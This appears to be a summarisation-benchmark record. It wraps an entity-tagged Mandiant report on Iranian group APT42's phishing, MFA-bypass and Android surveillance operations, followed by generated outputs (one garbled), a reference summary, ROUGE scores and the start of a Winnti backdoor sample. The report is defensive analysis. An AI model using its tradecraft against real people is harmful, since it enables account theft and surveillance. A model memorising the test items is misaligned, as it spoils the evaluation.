pandemic in [DATE] March [DATE] 2020 and the pursuit of domestic and foreign - based opposition groups prior to an [NORP] Iranian presidential election . This indicates that APT42 is trusted by the [NORP] Iranian government to quickly react to geopolitical changes by adjusting their flexible operations to targets of operational interest to [GPE] Tehran . APT [CARDINAL] 42 TargetingTargeted IndustriesCivil society and non - profitsEducationGovernmentsHealthcareLegal and professional servicesManufacturingMedia and entertainmentPharmaceuticalsFIGURE 2 . Countries and industries targeted directly by APT42.5Personal Email Targeting APT42 has consistently targeted the personal email accounts and [ORG] MFA codes of individuals of interest to the [NORP] Iranian government.\u2022 In [DATE] May [DATE] 2017 , APT42 targeted the senior leadership of an [ORG] Iranianopposition group operating from [LOC] Europe and [LOC] North [LOC] America with spear - phishing emails mimicking legitimate Google correspondence . The emails contained links to fake [ORG] Google [ORG] Books pages which redirected to sign - in pages designed to steal credentials and [CARDINAL] two - factor authentication codes . Cyber Espionage OperationsAPT42 operations are consistent with [GPE] Iran \u2019s strategic priorities and reflect an operational mandate to collect information on individuals and organizations of interest to the [NORP] Iranian government or deemed to pose a threat to the regime . The group \u2019s activity focuses on social engineering and exhibits patience and resource - intensive efforts to craft targeted decoy content and build rapport with targets before providing a credential harvesting link or malicious attachment . [ORG] Credential [ORG] Harvesting [ORG] Activity [ORG] APT42 has consistently targeted Western think tanks and academics , media organizations , members of the [NORP] Iranian diaspora in [GPE] the [GPE] United [GPE] Kingdom , [GPE] Israel , [GPE] the [GPE] United [GPE] States and high - profile [NORP] Iranian individuals within [GPE] Iran in efforts to collect credentials of individuals of interest to the [NORP] Iranian government . Some credential harvesting efforts have also included components designed to steal [ORG] MFA codes . FIGURE [CARDINAL] 3 . APT42 fake Google Books page.\u2022 In [DATE] April [DATE] 2018 , APT42 targeted [ORG] the [ORG] Google [ORG] Gmail account of an [NORP] Iranian environmental activist with a fake login page . The individual hadpreviously been arrested by the [NORP] Iranian government which cracked down on environmental activism in early 2018.6FIGURE 4 . [PERSON] Gmail login page personalized for a redacted victim ( left ) , spoofed [CARDINAL] two - factor authentication ( right).\u2022 In [DATE] October [DATE] 2019 , APT42 attempted to steal the personal [PERSON] Gmail credentials of an [NORP] Iranian lecturer and newspaper editor in Israel.\u2022 In [DATE] February [DATE] 2021 , APT42 targeted the personal email credentials of a senior [NORP] Israeli government official with a credential harvestingpage mimicking the [PERSON] Gmail login page . FIGURE [CARDINAL] 5 . Pre - filled login form for credential harvesting.\u2022 In [DATE] June [DATE] 2020 , APT42 sent a spear - phishing email to an employee of a U.S.-based non - profit organization who had previously publishedon the condition of [GPE] Iran \u2019s civil society.7 \u2013 After sending an email from the compromised inbox , APT42attempted to cover their tracks by deleting the message from the victim \u2019s Sent folder . \u2013 APT42 also attempted to access the personal email accountsof their targets , taking careful steps to avoid detection . \u2013 APT42 was able to bypass multi - factor authentication bycapturing [ORG] SMS - based [CARDINAL] one - time passwords and successfully setting up [CARDINAL] two - factor verification using the [ORG] Microsoft [ORG] Authenticator application . \u2013 Once inside [CARDINAL] one victim organization , APT42 accessed filesrelating to [GPE] Iran through their M365 environment . \u2013 The group authenticated to the compromised accountsusing an Outlook client , suggesting existing mail items may have been synchronized with the attacker 's host . Impersonation and [ORG] Building [ORG] Trust [ORG] APT42 often attempts to build rapport with their target by impersonating journalists or researchers and engaging the target in benign conversation for [DATE] multiple [DATE] days or [DATE] weeks before sending a malicious link . In some cases , the group uses compromised email accounts in follow - on operations targeting colleagues , acquaintances or relatives of the initial victim.\u2022 APT42 used a compromised email account belonging to a [GPE] U.S.- based think tank employee to target [LOC] Middle [LOC] East researchers at other think tanks and academic organizations , [GPE] U.S. government officials involved in [LOC] Middle [LOC] East and [GPE] Iran policy , a former [NORP] Iranian government official , and high - ranking members of an [NORP] Iranian opposition group [DATE] between [DATE] March [DATE] and [DATE] June [DATE] 2021 . \u2013 The actor posed as a well - known journalist from a [GPE] U.S. media organization requesting an interview and engaged the initial target for [DATE] 37 [DATE] days to gain their trust before finally directing them to a credential harvesting page . In other instances , APT42 provided a [ORG] Dropbox link to a [ORG] PDF with an embedded URL shortening link that led to a credential harvesting page ( shown in Figure [DATE] 6).FIGURE [DATE] 6 . [ORG] PDF document with embedded link to credential harvesting page.\u2022 APT42 impersonated a legitimate [NORP] British news organization to obtain the personal email credentials of political science professorswith ties to local governments or with relatives holding dual citizenship with [GPE] Iran in [DATE] February [DATE] 2022 . The group invited its targets , located in [GPE] Belgium and [GPE] the [GPE] United [GPE] Arab [GPE] Emirates , to an online interview via a customized [ORG] PDF document containing an embedded link leading to a [PERSON] Gmail credential harvesting page.8FIGURE 7 . [ORG] PDF with interview invitation.\u2022 In [DATE] the [DATE] weeks ahead of [EVENT] Iran \u2019s [EVENT] June 18 , [EVENT] 2021 , presidentialelection , APT42 used a compromised email address belonging to an [GPE] Iran researcher at a [GPE] U.S. think tank to spear phish a member of an [NORP] Iranian opposition group headquartered in [LOC] Europe in a probable attempt to gain access to the organization and its other members . The group impersonated the researcher and invited the target to review and provide feedback on [CARDINAL] one of the researcher \u2019s articles on [NORP] Iranian nuclear issues in a likely effort to build trust with the target before engaging in further conversation.\u2022 [DATE] Between [DATE] March [DATE] and [DATE] June [DATE] 2020 , APT42 targeted high - profile individuals in the [GPE] U.S. pharmaceutical industry in what may have been a temporary shift to support [NORP] Iranian public health priorities amid the COVID-19 pandemic . APT42 attempted to steal personal email credentials with credential harvesting forms masquerading as popular email services such as [PERSON] Gmail and [ORG] Yahoo and impersonated a legitimate vaccinologist at [ORG] the [ORG] University [ORG] of [ORG] Oxford , claiming to have identified an information leakage from the targeted organization.9FIGURE 8 . APT42 impersonates [ORG] University [ORG] of [ORG] Oxford vaccinologist . FIGURE [CARDINAL] 9 . APT42 Credential harvesting page masquerading as a [ORG] Yahoo login portal . [ORG] Surveillance [ORG] Operations [ORG] Mandiant assesses with high confidence that APT42 conducts surveillance and monitoring operations against individuals of interest to the [NORP] Iranian government . In addition to credential harvesting activity , the group uses mobile malware to target individuals of interest , including those with connections to [ORG] the [ORG] Green [ORG] Movement in [GPE] Iran and other political targets . Mandiant observed APT42 target individuals who claimed to be able to provide tools to bypass government restrictions such as those imposed on Telegram.\u2022 APT42 likely delivers its [ORG] Android malware such as [ORG] VINETHORNand [ORG] PINEFLOWER via text [CARDINAL] messages.1 [CARDINAL] 0\u2022 [DATE] Between [DATE] July [DATE] 2020 [DATE] and [DATE] March [DATE] 2021 , the group successfully used [PERSON] PINEFLOWER [PERSON] Android malware to compromise [CARDINAL] several [CARDINAL] dozen [ORG] Android devices we believe belong to individuals residing in [GPE] Iran . \u2013 APT42 exfiltrated recorded phone calls , room audiorecordings , images and entire SMS inboxes from [CARDINAL] at [CARDINAL] least [CARDINAL] 10 compromised devices , often [DATE] daily . \u2013 APT42 used earlier versions of [GPE] PINEFLOWER as early as [CARDINAL] 2015.\u2022 APT42 infrastructure served as command and control for a VINETHORN payload masquerading as a legitimate [ORG] VPN application [DATE] between [DATE] April [DATE] and [DATE] October [DATE] 2021.\u2022 [ORG] Mandiant most recently observed APT42 PINEFLOWER activitytargeting [GPE] Iran - based individuals with ties to universities , reformist political groups , and human rights activists [DATE] between [DATE] June [DATE] and [DATE] August [DATE] 2022.FIGURE [DATE] 10 . VINETHORN malicious Android application.\u2022 In [DATE] early [DATE] July [DATE] 2021 , APT42 hosted malicious webpages masquerading as an adult content website and a free audio / video calling and instantmessenger software . The landing pages profiled visitors to the page , requested the user to turn on location services , and sent the data back to a hard - coded [ORG] Telegram chat . In [CARDINAL] one instance , the page supported formatting for mobile devices and displayed requests to the user in [LANGUAGE] Arabic , suggesting [NORP] Arabic speakers may have been targeted . [GPE] Iran saw significant protests in [DATE] July [DATE] 2021 , including in the [GPE] Khuzestan region , which is home to [GPE] Iran \u2019s [NORP] Arab minority.1 [CARDINAL] 1Malware Operations While APT42 focuses on credential harvesting rather than deploying malware on a system , several custom backdoors and lightweight tools complement its arsenal . Since [DATE] 2020 , APT42 has primarily relied on lightweight toehold backdoors over fully functional modular tools . [ORG] Mandiant assesses that APT42 has limited in - house malware development resources because recent malware families such as [ORG] TABBYCAT and [GPE] VBREVSHELL have included or largely consisted of publicly available code copied from [ORG] GitHub projects.\u2022 In [DATE] September [DATE] 2021 , APT42 used a compromised Europeangovernment email account to send a phishing email to [CARDINAL] almost [CARDINAL] 150 email addresses associated with individuals or entities employed by or affiliated with civil society , government or intergovernmental organizations around the world . The email used lure content pertaining the organizational chart of an embassy in [GPE] Tehran and contained a [FAC] Google [FAC] Drive link to a malicious macro document leading to [ORG] TAMECAT , a [ORG] PowerShell toehold backdoor.\u2022 In [DATE] January and February 2022 , APT42 hosted severalmalicious Office documents on an [ORG] Amazon [ORG] Web [ORG] Service instance , [FAC] Google [FAC] Drive and [ORG] Dropbox . Likely delivered via a link sent in a spear - phishing email , the malicious documents used geopolitically themed decoy content and fetched a password - protected remote template document via [ORG] Microsoft [ORG] OneDrive links . These documents led to [ORG] TABBYCAT and [GPE] VBREVSHELL malware , which are a [ORG] VBA - based dropper and reverse shell macro , respectively.\u2022 APT42 infrastructure hosted malicious [ORG] PowerShell codein the banners of odd ports in [DATE] early [DATE] March [DATE] 2022 . The code , when run , retrieved additional [ORG] PowerShell payloads including POWERPOST , a custom reconnaissance tool that can collect data on a local host , including system information and local account names . FIGURE [CARDINAL] 11 . APT42 domain masquerades as legitimate messaging platform . The use of [ORG] Android malware to target individuals of interest to the [NORP] Iranian government provides APT42 with a productive method of obtaining sensitive information on targets , including movement , contacts and personal information . The group \u2019s proven ability to record phone calls , activate the microphone and record the audio , exfiltrate images and take pictures on command , read SMS messages and track the victim 's GPS location in real time poses a real - world risk to individual victims of this campaign . FIGURE [CARDINAL] 12 . Banner response ( left ) versus de - obfuscated [ORG] PowerShell code ( right).1 2Potential Ties Between APT42 and Ransomware ActivityMandiant further highlights open - source reporting from [ORG] Microsoft claiming a connection between intrusion activity clusters that generally align with APT42 and [PERSON] UNC2448 , an [GPE] Iran - nexus threat actor known for widespread scanning for various vulnerabilities , the use of the Fast Reverse Proxy tool , and reported ransomware activity using [ORG] BitLocker . Notably , [ORG] Mandiant has not observed technical overlaps between APT42 and UNC2448.\u2022 In [DATE] November [DATE] 2021 , [ORG] Microsoft reported that \u201c Phosphorus\u201dhad targeted [ORG] Fortinet [ORG] FortiOS SSL VPN and unpatched on - premises Exchange servers globally with the intent of deploying ransomware such as [ORG] BitLocker on vulnerable networks , aligning with activity we track as [PERSON] UNC2448 . Previous reporting on Phosphorus generally aligned with APT42 \u2019s credential harvesting and spear - phishing operations . While [ORG] Mandiant has not observed technical overlaps between APT42 and [PERSON] UNC2448 , the latter may also have ties to the IRGC - IO . We assess with moderate confidence that [PERSON] UNC2448 and the [ORG] Revengers [PRODUCT] Telegram persona are operated by [CARDINAL] at [CARDINAL] least [CARDINAL] two [NORP] Iranian front companies , [ORG] Najee [ORG] Technology and [PERSON] Afkar [PERSON] System , based on open - source information and operational security lapses by the threat actors . Public leaking campaigns from the Lab Dookhtegan Telegram account further allege these companies are responsible for threat activity aligned with [ORG] UNC2448 and operate on behalf of the [ORG] IRGC - IO.\u2022 Mandiant identified links between [ORG] UNC2448 , the [PERSON] Revengerspersona , an individual named [PERSON] Ahmad [PERSON] Khatibi , and a likely [NORP] Iranian front company named [PERSON] Afkar [PERSON] System.\u2022 The [ORG] Revengers persona had offered data and access toprimarily [NORP] Israeli companies for sale on its [ORG] Telegram channel [DATE] between [DATE] February [DATE] and [DATE] September [DATE] 2021.\u2022 Additionally , infrastructure overlaps likely caused by humanerror indicate that [ORG] UNC2448 has connections to a [ORDINAL] second front company , [ORG] Najee [ORG] Technology.\u2022 [ORG] Public posts by the Lab Dookhtegan Telegram channel in [GPE] July2022 claim [PERSON] Afkar [PERSON] System and [ORG] Najee [ORG] Technology are front companies conducting cyber operations on behalf of [ORG] the [ORG] IRGC \u2019s [ORG] Intelligence [ORG] Organization . [ORG] AttributionMandiant assesses with high confidence that APT42 conducts cyber espionage operations on behalf of the [NORP] Iranian government based on [DATE] years of activity targeting unique , high - priority targets both inside and outside of [GPE] Iran . Both [GPE] Iran \u2019s [ORG] Islamic [ORG] Revolutionary [ORG] Guard [ORG] Corps and [ORG] Ministry [ORG] of [ORG] Intelligence [ORG] and [ORG] Security have the mandate to conduct cyber espionage operations against the domestic populace and foreign targets of strategic intelligence value . However , we estimate with moderate confidence that APT42 operates on behalf of [ORG] the [ORG] Islamic [ORG] Revolutionary [ORG] Guard [ORG] Corps \u2019 [ORG] Intelligence [ORG] Organization based on targeting patterns that align with the organization \u2019s operational mandates and priorities , which includes defending the regime against internal and external threats , pursuing perceived domestic enemies , and confronting \u201c revolutionary \u201d ideas emanating from the West . Historical Connections to APT35APT42 generally corresponds with activity other organizations have referred to as [WORK_OF_ART] TA453 ( [GPE] Proofpoint ) , [PERSON] Yellow [PERSON] Garuda ( PwC ) , and ITG18 ( [ORG] IBM ) . The group is also consistent with a sub - section of publicly reported threat clusters : Phosphorus ( [ORG] Microsoft ) and [PERSON] Charming [PERSON] Kitten ( [ORG] ClearSky and [ORG] CERTFA ) . Similarity in malicious cyber operations between various [NORP] Iranian groups and a dynamic institutional ecosystem in [GPE] Iran contributed to significant conflation of historical APT42 and APT35 activity . [ORG] Mandiant assesses with moderate confidence that both APT35 and APT42 operate on behalf of the [ORG] IRGC but originate from different missions and contracts or contractors based on substantial differences in their respective targeting patterns and tactics , techniques and procedures.\u2022 Historical APT35 operations focused on long - term , resource intensive operations targeting the [GPE] U.S. and [NORP] Middle [NORP] Eastern military , diplomatic , and government personnel , organizations in the media , energy , and defense industrial base , and engineering , business services , and telecommunications sectors.\u2022 In contrast , APT42 operations focus on individualsand organizations of interest to the [NORP] Iranian government for domestic politics , foreign policy , and regime stability purposes.\u2022 While both APT42 and APT35 have used MAGICDROP and [ORG] BROKEYOLK malware , [ORG] Mandiant observed no similarities between the respective C2 infrastructure or how the groups operationalized the [ORG] malware.\u2022 The [ORG] IRGC frequently relies on contractors to execute differentcyber operations mission sets ( such as [ORG] U.S. [ORG] Treasury [ORG] Department sanctions against Net Peygard Samavat).Outlook and ImplicationsAPT42 has consistently targeted the personal email credentials , Multi - factor authentication codes and mobile device location and communication data of individuals of interest to the [NORP] Iranian government . They can use this access to enable follow - on compromises of corporate networks such as those of Western think tanks , academics , media organizations , biomedical research and pharmaceutical companies and governments . The group \u2019s surveillance activity highlights the real - world risk to individual targets of APT42 operations , which include [NORP] Iranian dual - nationals , former government officials and dissidents both inside [GPE] Iran and those who previously left the country , often out of fear for their personal safety.1 [PRODUCT] 3We do not anticipate significant changes to APT42 \u2019s operational tactics and mandate given the long history of activity and imperviousness to infrastructure take downs and a media spotlight on operational security failures . Nevertheless , the group has displayed its ability to rapidly alter its operational focus as [GPE] Iran \u2019s priorities change over time with evolving domestic and geopolitical conditions . We assess with high confidence that APT42 will continue to perform cyber espionage and surveillance operations aligned with evolving [NORP] Iranian operational intelligence collection requirements . Technical Annex : [PERSON] Attack [PERSON] Lifecycle1 [CARDINAL] 4\u2022 CHAIRSMACK \u2022 Adding alternate email address to accounts \u2022 Deleting login noti\ufb01cation emails \u2022 Deleting sent emails \u2022 Windows Registry modi\ufb01cations\u2022 Accessing victim \u2019s personal email accounts \u2022 Spear phishing additional victims using a compromised accountMAINTAIN PRESENCEMOVE LATERALLYESCALATE PRIVILEGEINTERNALRECONNAISSANCE\u2022 CHAIRSMACK \u2022 Browsing victom \u2019s contacts \u2022 Synchronizing mail items [ORG] \u2022 [ORG] Taking [ORG] screenshotsCOMPLETE [ORG] MISSION\u2022 [ORG] Credential theft \u2022 Obtaining \ufb01les from victim [ORG] Sharepoint [ORG] \u2022 [ORG] Personal data theft \u2022 Phishing additional victims from compromised [ORG] accountINITIAL [ORG] COMPROMISEESTABLISH FOOTHOLD\u2022 Byoassing [ORG] MFA [ORG] \u2022 [ORG] Credential theft \u2022 Credential harvesting forms \u2022 Patient social engineering \u2022 SMS messages for Android malware \u2022 Spear phishing\u2022 BROKEYOLK Authenticator [DATE] applicationFIGURE [DATE] 13 . APT42 [PERSON] Attack [PERSON] Lifecycle . Initial Compromise APT42 primarily relies on spear phishing to perform an initial compromise . The group is patient and creative in their social engineering efforts , often engaging their target for [DATE] days or [DATE] weeks to build trust before providing a link to a credential harvesting page or attaching a malicious attachment to their correspondence . APT42 is capable of bypassing [ORG] MFA and intercepting SMS - based [CARDINAL] one - time passwords using credential harvesting forms and likely delivers [ORG] Android malware via SMS messages.\u2022 APT42 frequently impersonates well - known journalists or public figures ostensibly requesting interviews with their targets . In [CARDINAL] one instance , APT42 conversed with their target for [DATE] 37 [DATE] days before sending them a URL shortening link that redirected to a credential harvesting page.\u2022 APT42 sends spear phishing emails containing a [ORG] PDFdocument attachment or links to [FAC] Google [FAC] Drive or Dropbox- hosted [ORG] PDF documents with an embedded link to a credential harvesting page.\u2022 The group is capable of intercepting [ORG] MFA authentication codesvia credential harvesting forms . Establish Foothold Once successfully authenticated to a victim \u2019s personal or corporate email account , APT42 registers their own [ORG] Microsoft [ORG] Authenticator application as a new [ORG] MFA method . environments , APT42 uses a variety of primarily lightweight malware , some of which are based on publicly available scripts . Examples include:\u2022 BROKEYOLK\u2022 CHAIRSMACK\u2022 GHAMBAR\u2022 MAGICDROP\u2022 POWERPOST\u2022 PINEFLOWER\u2022 TABBYCAT\u2022 TAMECAT\u2022 [ORG] VBREVSHELL\u2022 [ORG] VINETHORNEscalate [ORG] Privileges [ORG] APT42 uses custom malware capable of logging keystrokes and stealing logins and cookie data for common browsers to perform privilege escalation in a victim environment . Examples include : Maintain Presence To maintain their presence in a victim \u2019s environment , APT42 relies on custom malware using scheduled tasks or Windows registry modifications for persistence , including:1 5\u2022 [PERSON] CHAIRSMACK\u2022 GHAMBARAdditionally , APT42 uses various techniques to maintain access to a victim \u2019s personal or corporate email account , including registering their [ORG] Microsoft [ORG] Authenticator application to receive [ORG] MFA codes to their own devices . When APT42 sends spear- phishing emails from a compromised account or attempts to move laterally to a different account , the group deletes login notification emails and clears the messages from the Sent folder to cover their tracks . [ORG] Complete [ORG] Mission [ORG] Mandiant assesses that APT42 \u2019s objective is [CARDINAL] two - fold:\u2022 APT42 seeks to steal credentials to personal and corporate email accounts and use those credentials to conduct follow- on operations and steal personal or business documents and research pertinent to [PERSON] Iran.\u2022 [PERSON] APT42 seeks to track the locations , monitor the phone andemail communications and generally surveil the activities of individuals of interest to the [NORP] Iranian government , including activists and dissidents inside [GPE] Iran . We have no evidence to suggest APT42 hands harvested credentials to other threat actors for follow - on operations at this time.\u2022 CHAIRSMACK\u2022 DOSTEALER\u2022 GHAMBARInternal Reconnaissance After logging in to the target environment with stolen credentials , APT42 conducts internal reconnaissance by browsing the compromised user \u2019s contacts and accessing the targeted organization \u2019s collaborative spaces , such as [ORG] Sharepoint . The group also logs in to compromised accounts with a [ORG] Microsoft [ORG] Outlook client , which can lead the existing mail items from affected users to be synchronized with the attacker \u2019s host . This access can be used to spear phish additional targets with legitimate , stolen content from the compromised organization or pre - existing email conversations . APT42 also uses malware capable of taking screenshots and collecting system and network information , including:\u2022 GHAMBAR\u2022 [ORG] POWERPOSTLateral [ORG] Movement To move laterally , APT42 often attempts to use the compromised personal email account of the victim to access other the victim \u2019s corporate accounts , and vice versa . The group sends spear- phishing emails from compromised email accounts to additional targets both internal and external to the targeted organization.\u2022 In [DATE] April [DATE] 2021 , APT42 used a compromised corporate emailaccount of an employee at a U.S.-based think tank to access the individual \u2019s personal email account . The corporate account , configured as a recovery email , received login verification codes from the personal email provider , which APT42 deleted to cover their tracks.\u2022 On multiple occasions , APT42 used their victim \u2019s trusted relationships with their contacts to send additional spear- phishing emails to follow - on targets , including coworkers , industry peers and relatives.1 6Appendix 1 . MITRE ATT&CK MappingTABLE [CARDINAL] 1 . [ORG] Resource [ORG] Development . T1583.003T1584T1587.003T1588.004TABLE 2 . [ORG] Initial [ORG] Access . T1133T1566.001T1566.002TABLE 3 . Execution . T1047T1059.001T1059.005T1059.007T1569.002T1204.001T1204.002TABLE [CARDINAL] 4 . Persistence . [CARDINAL] T1098.002T1133T1543.003T1547.001T1547.004TABLE [CARDINAL] 5 . Privilege Escalation . T1055T1134T1543.003T1547.001T1547.004Acquire Infrastructure : Virtual Private ServerCompromise InfrastructureDevelop Capabilities : Digital CertificatesObtain Capabilities : Digital CertificatesExternal Remote ServicesSpear - phishing [ORG] AttachmentSpear - phishing [ORG] LinkWindows [ORG] Management [ORG] InstrumentationCommand and Scripting Interpreter : PowerShellCommand and Scripting Interpreter : Visual BasicCommand and Scripting Interpreter : JavaScript / [ORG] JscriptSystem [ORG] Services : Service ExecutionUser Execution : Malicious [ORG] LinkUser Execution : Malicious FileAccount Manipulation : Exchange Email Delegate PermissionsExternal Remote ServicesCreate or [ORG] Modify [ORG] System [ORG] Process : Windows ServiceBoot or [PERSON] Logon [PERSON] Autostart Execution : Registry Run [ORG] Keys [ORG] / [ORG] Startup [ORG] FolderBoot or [ORG] Logon Autostart Execution : [ORG] Winlogon [ORG] Helper [ORG] DLLProcess InjectionAccess Token ManipulationCreate or [ORG] Modify [ORG] System [ORG] Process : Windows ServiceBoot or [PERSON] Logon [PERSON] Autostart Execution : Registry Run [ORG] Keys [ORG] / [ORG] Startup [ORG] FolderBoot or [ORG] Logon Autostart Execution : [ORG] Winlogon [ORG] Helper [ORG] DLL1 7TABLE 6 . Defense Evasion . T1027.002T1027.005T1055T1070.004T1112T1134T1140T1221T1497.001T1497.003T1564.003TABLE 7 . Credential Access . T1003T1111T1056.001TABLE [CARDINAL] 8 . [PRODUCT] Discovery . T1012T1016T1082T1083T1087.001T1497.001T1497.003T1518Obfuscated [PERSON] Files or Information : Software PackingObfuscated Files or Information : Indicator Removal from [ORG] ToolsProcess [ORG] InjectionIndicator [ORG] Removal on Host : File DeletionModify RegistryAccess Token ManipulationDeobfuscate / Decode Files or [ORG] InformationTemplate InjectionVirtualization [ORG] / Sandbox Evasion : [ORG] System ChecksVirtualization [ORG] / Sandbox Evasion : Time Based EvasionHide Artifacts : Hidden WindowOS Credential [CARDINAL] DumpingTwo - Factor Authentication InterceptionInput Capture : [ORG] KeyloggingQuery [ORG] RegistrySystem [ORG] Network [ORG] Configuration DiscoverySystem Information DiscoveryFile and Directory DiscoveryAccount Discovery : Local AccountVirtualization [ORG] / Sandbox Evasion : [ORG] System ChecksVirtualization [ORG] / Sandbox Evasion : Time Based EvasionSoftware DiscoveryTABLE 8 . [ORG] Lateral [ORG] Movement . T1021.001T1021.004Remote Services : Remote Desktop ProtocolRemote Services : SSH1 [DATE] 8TABLE [DATE] 9 . Collection . T1056.001T1113T1115T1123T1125T1213Input Capture : [ORG] KeyloggingScreen [ORG] CaptureClipboard DataAudio CaptureVideo CaptureData from [ORG] Information Repositories : [ORG] SharepointT1560.002Archive [ORG] Collected [ORG] Data : Archive via [LAW] LibraryTABLE [LAW] 10 . [ORG] Command and [ORG] Control . T1071.001T1071.002T1095T1102T1105T1132Application Layer Protocol : Web ProtocolsApplication Layer Protocol : File Transfer ProtocolsNon - Application Layer ProtocolWeb ServiceIngress Tool TransferData Encoding : Standard EncodingT1573.002Encrypted Channel : [PERSON] Asymmetric [PERSON] CryptographicTABLE 11 . Exfiltration . T1041TABLE 12 . Impact . T1529Exfiltration over [ORG] C2 [ORG] ChannelSystem Shutdown [ORG] / Reboot1 9Appendix 2 . [PERSON] Malware Used by [DATE] APT42TABLE [DATE] 13 . [ORG] Malware used by [PERSON] APT42.MalwareBROKEYOLKCHAIRSMACKDOSTEALERGHAMBARMAGICDROPPINEFLOWERPOWERPOSTSILENTUPLOADERTABBYCATTAMECATVBREVSHELLVINETHORNDescriptionBROKEYOLK is a .NET downloader that downloads and executes a file from a hard - coded command and control ( C2 ) server . The malware communicates via [ORG] SOAP ( Simple [ORG] Object [ORG] Access [ORG] Protocol ) requests using [ORG] HTTP.CHAIRSMACK is a backdoor written in [LANGUAGE] C++ that communicates using HTTP . [ORG] CHAIRSMACK 's core functionality involves expanding its capabilities by retrieving plugins from a C2 server . Downloaded plugins are cached on disk for future use . Capabilities added via plugins are inferred based on supported backdoor command names . These capabilities include shell command execution , screenshot capture , audio capture , keylogging , file transfer , and file execution . [ORG] DOSTEALER is a dataminer that mines browser login and cookie data . It is also capable of taking screenshots and logging keystrokes . GHAMBAR is a remote administration tool ( RAT ) that communicates with its [CARDINAL] C2 server using [ORG] SOAP requests over HTTP . Its capabilities include filesystem manipulation , file upload and download , shell command execution , keylogging , screen capture , clipboard monitoring , and additional plugin execution . MAGICDROP is a dropper written in [LANGUAGE] C++ . It decrypts files from its .data section and writes them to disk in the system 's % TEMP% directory . The files dropped often include a decoy file , a next - stage payload , and sometimes an installer for the payload . PINEFLOWER is an [ORG] Android malware family capable of a wide range of backdoor functionality , including stealing system inform information , logging and recording phone calls , initiating audio recordings , reading SMS inboxes and sending SMS messages . The malware also has features to facilitate device location tracking , deleting , downloading , and uploading files , reading connectivity state , speed , and activity , and toggling Bluetooth , Wi - Fi , and mobile data settings . POWERPOST is a reconnaissance tool written in [ORG] PowerShell that can collect data on a local host including system information and user account names . POWERPOST writes the data to disk and then sends the collected data to a hardcoded remote server via HTTP POSTs . SILENTUPLOADER is an uploader written in [GPE] MSIL that is dropped by [ORG] DOSTEALER and is designed to work specifically in tandem with it . It checks for files in a specified folder [TIME] every [TIME] 30 [TIME] seconds and uploads them to a remote server . TABBYCAT is a Microsoft Word [ORG] VBA macro that functions as a dropper . It relies on social engineering in order to be executed as a macro within a decoy [PERSON] Microsoft [PERSON] Word document . It decodes a payload embedded in a [ORG] UserForm and launches it . TABBYCAT has been observed dropping the [PERSON] VBREVSHELL backdoor . TAMECAT is a [ORG] PowerShell toehold that can execute arbitrary [ORG] PowerShell or C # content . TAMECAT has been observed dropped by malicious macro documents , communicates with its C2 node via HTTP , and expects data from the C2 to be Base64 - encoded . [PERSON] VBREVSHELL is a [ORG] VBA macro that spawns a reverse shell relying exclusively on Windows API calls . VINETHORN is an [ORG] Android malware family capable of a wide range of backdoor functionality . It can steal system information , read SMS names are or may be trademarks or service marks of their respective owners . I - EXT - RT - US - EN-000454 - 01", "generated_text": "an Iranian state-sponsored cyber espionage group; TAPT42; info collection; surveillance operations; individuals; organizations; strategic interest; the Iranian government; trust; their victims; email; individuals; corporate; personal email accounts; credential harvesting; Multi-factor authentication; compromise; credentials; access; devices; accounts; employees; colleagues; relatives; Android malware; location; mobile malware; mobile malware; phone conversations; images; SMS; screenshots; pre-configured credentials; access; devices; passwords; a subset; Android mobile malware; the group; targeting; entities; individuals; groups; military; organizations; law enforcement; government agencies; technology; organizations; government functions; intelligence; theft; aphishing; attacks; a recent report; a new group; APT42; interest; at least 2015; the group; a common background; victimization; attention.", "ref_text": "<START-1>Here is a summary of the key points from the Mandiant report on the Iranian state-sponsored hacking group APT42: APT42 is a prolific Iranian cyber espionage group active since at least 2015. Mandiant assesses with moderate confidence they operate on behalf of the Islamic Revolutionary Guard Corps (IRGC). The group relies on highly targeted spear phishing to compromise accounts and mobile devices of individuals and organizations of interest to Iran. This includes government officials, journalists, academics, and dissidents. Once compromised, APT42 has deployed Android malware capable of location tracking, recording communications, and stealing SMS messages and images. APT42 focuses on building trust with targets before sending credential harvesting links or attachments. They often impersonate journalists over weeks before acting maliciously. The group has consistently targeted Western think tanks, the Iranian diaspora, and the personal accounts of government officials. Their targeting aligns with Iranian intelligence priorities. APT42 uses a range of custom malware in operations, including backdoors, keyloggers, and Android surveillance tools. Some tools reuse code from public GitHub repositories. The report provides technical details on APT42's tactics, known malware, infrastructure, targeting, and attributes them with high confidence to the Iranian government based on strategic alignment. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4954682779456194, "gpt3/lexical/rouge_rouge2": 0.2127659574468085, "gpt3/lexical/rouge_rougeL": 0.2719033232628399, "gpt3/lexical/rouge_rougeLsum": 0.2719033232628399, "gpt3_generated_text": ["The article discusses the activities of APT42, an Iranian state-sponsored cyber espionage group. Mandiant assesses with high confidence that APT42 is tasked with conducting information collection and surveillance operations against individuals and organizations of strategic interest to the Iranian government. The group has been active since at least 2015 and primarily relies on highly targeted spear-phishing campaigns to gain access to email accounts and steal credentials. APT42 also conducts surveillance operations using mobile malware to track locations, monitor communications, and surveil individuals of interest. The group has targeted a wide range of sectors and organizations in at least 14 countries. The article highlights that APT42 has the ability to alter its operational focus based on Iran's priorities, and it is expected to continue its cyber espionage operations in the long term."]}, {"split_name": "val", "sample_id": "val_49", "prompt_text": "Extract the keywords: [ORG] Winnti [ORG] Group \u2019s skip\u20112.0 : A Microsoft SQL Server backdoorwelivesecurity.com/2019/10/21/winnti-group-skip2-0-microsoft-sql-server-backdoorOctober [CARDINAL] 21 , 2019Notorious cyberespionage group debases [PRODUCT] MSSQLMathieu [PRODUCT] Tartare [PRODUCT] 21 [PRODUCT] Oct [DATE] 2019 [DATE] - [DATE] 11:30AM For a while , ESET researchers have been tracking the activities of [ORG] the [ORG] Winnti [ORG] Group , active since [DATE] at [DATE] least [DATE] 2012 and responsible for high - pro\ufb01le supply - chain attacks against the video game and software industry . Recently , we discovered a previously undocumented backdoor targeting [ORG] Microsoft [ORG] SQL ( [ORG] MSSQL ) that allows attackers to maintain a very discreet foothold inside compromised organizations . This backdoor bears multiple similarities to the [ORG] PortReuse backdoor , another tool used by [ORG] the [ORG] Winnti [ORG] Group that was \ufb01rst documented by ESET in [DATE] October [DATE] 2019 , such as the use of the same custom packer and [ORG] VMProtected launcher , which is why we attribute this backdoor to [ORG] the [ORG] Winnti [ORG] Group . [DATE] Earlier [DATE] this [DATE] year , we received a sample of this new backdoor called skip-2.0 by its authors and part of [ORG] the 